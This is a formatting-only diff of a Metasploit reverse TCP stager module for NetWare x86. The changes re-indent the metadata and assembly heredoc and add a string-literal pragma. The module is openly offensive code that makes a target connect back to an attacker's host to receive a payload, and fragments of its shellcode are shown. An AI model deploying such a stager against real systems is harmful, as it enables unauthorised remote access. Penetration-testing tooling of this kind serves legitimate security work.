@@ -1,16 +1,14 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 require 'metasm'
 require 'msf/core'
 require 'msf/core/handler/reverse_tcp'
 
-
 module MetasploitModule
-
   CachedSize = 281
 
   include Msf::Payload::Stager
@@ -18,22 +16,22 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'Reverse TCP Stager',
-      'Description'   => 'Connect back to the attacker',
-      'Author'        => 'toto',
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'netware',
-      'Arch'          => ARCH_X86,
-      'Handler'       => Msf::Handler::ReverseTcp,
-      'Convention'    => 'sockesi',
-      'Stager'        =>
-        {
-          'Offsets' =>
-            {
-              'LHOST' => [ 0, 'ADDR' ],
-              'LPORT' => [ 0, 'n'    ],
-            },
-          'Assembly' => <<EOS
+                     'Name'          => 'Reverse TCP Stager',
+                     'Description'   => 'Connect back to the attacker',
+                     'Author'        => 'toto',
+                     'License'       => MSF_LICENSE,
+                     'Platform'      => 'netware',
+                     'Arch'          => ARCH_X86,
+                     'Handler'       => Msf::Handler::ReverseTcp,
+                     'Convention'    => 'sockesi',
+                     'Stager'        =>
+                       {
+                         'Offsets' =>
+                           {
+                             'LHOST' => [ 0, 'ADDR' ],
+                             'LPORT' => [ 0, 'n'    ]
+                           },
+                         'Assembly' => <<EOS
 jmp main_code
 
 //
@@ -206,10 +204,9 @@ fct_ptrs:
   dd 0x6877687c         // AFPTCP.NLM|LB_malloc
   dd 0x8967f0ce         // NSS.NLM|NSSMPK_UnlockNss
 end_reverse:
-  nop
-EOS
-        }
-      ))
+                 nop
+               EOS
+                       }
+                    ))
   end
-
 end
